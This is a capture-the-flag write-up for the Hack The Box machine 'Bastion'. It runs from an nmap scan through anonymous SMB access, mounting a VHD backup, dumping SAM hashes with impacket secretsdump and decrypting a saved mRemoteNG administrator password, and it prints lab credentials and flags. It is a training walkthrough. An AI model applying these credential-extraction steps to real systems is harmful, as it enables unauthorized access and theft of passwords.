+++
title = "HTB - Bastion"
date = 2025-06-27
+++

### Scan
```
──(root㉿kali)-[/home/li0t/Desktop/HTB/Bastion]
└─# nmap -sVC -p- --open 10.10.10.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 19:23 EDT
Nmap scan report for 10.10.10.134
Host is up (0.13s latency).
Not shown: 65487 closed tcp ports (reset), 35 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-09-27T01:25:28+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-09-26T23:25:25
|_  start_date: 2024-09-26T20:41:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.83 seconds

```

### Enumeration
SMB doesn't relent with blank credentials, but will do so if we make up a username.
Backups share... `smbclient //10.10.10.134/Backups -U "ipps" --no-pass`
We find a note that talks about not transferrin the backup over VPN. This implies we need to mount in order to view backups. We can mount the share with: 
`mount -t cifs //10.10.10.134/backups /mnt/ -o user=,password=`
And we can view the files by:
`find /mnt/ -type f`
We see the VHD (Virtual Disk) backup files. 
We need to install a tool called `GuestMount` to view the file: `apt install libguestfs-tools`
We can mount the disks as such:
`guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd`
When we cd to `/mnt/vhd/`, we are in C drive. Because we have full access, if we go to where the system files are kept, i.e. `\Windows\System32\config`, we can run a `lssecretsdump.py`:
`python3 /opt/impacket/build/scripts-3.11/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL`
We get a password for an unknown user:`bureaulampje`. We can put 2 and 2 together to find out this belongs to `L4mpje`. We can also crack the `L4mpje` has if we want to confirm that it matches.
Once we have our credentials `L4mpje:bureaulampje`, we can unmount with: `umount -t cifs //10.10.10.134/backups` and SSH into the box.
USER:`9f8c17b16766ee0bf023278b04124bad`

Perusing around, it's so important to get the amount of reps in so that you know what stands out as unusua in a Windows configuration. Here, in Program Files (x86), there is a tool called mRemoteNG, which we learn is a remote connection management tool that allows users to save passwords for different types of connections. 

I switched to a Powershell by using `powershell`, and went to the `Users/AppData` directory to find the file that may have this information.

In the `ConfCons.xml`, we find a string like this:
```
Username="Administrator" 
Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
```
We can use a tool called `mRemoteNG-decrypt` to decipher the administrator password:
`python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==`

We are able to crack the credentials:`Administrator:thXLHM96BeKL0ER2`

SSH back into the box for high privilege access.
ROOT:`d2d9872af88cf5f39e529a90a4282269`



